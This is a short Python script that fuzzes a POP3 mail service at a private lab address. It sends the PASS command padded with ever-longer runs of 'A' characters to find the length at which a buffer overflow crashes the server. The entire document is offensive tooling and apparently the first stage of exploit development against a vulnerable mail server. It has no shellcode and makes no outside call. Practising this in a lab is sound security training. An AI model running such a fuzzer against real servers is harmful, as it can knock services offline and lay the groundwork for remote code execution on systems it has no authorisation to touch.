#!/usr/bin/python3

import sys,socket
from time import sleep
buffer=100

while buffer<=10000:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.1.2', 110))
    print(f"SENDING BUFFER: {buffer}")
    s.send((b'USER TEST\r\n'))
    s.send((b'PASS '+ b"A" * buffer + b'\r\n'))
    s.close()
    buffer+=200
    sleep(1)
